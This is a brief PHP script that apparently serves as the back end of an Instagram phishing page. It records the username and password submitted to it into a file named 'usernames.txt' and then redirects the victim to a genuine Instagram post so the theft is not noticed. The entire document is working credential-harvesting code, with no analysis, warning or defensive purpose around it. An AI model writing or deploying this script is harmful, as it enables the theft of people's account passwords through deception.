<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com/p/CI_A1Rog1D-/?igshid=1hpuvvb53ttdd');
exit(); 
?>
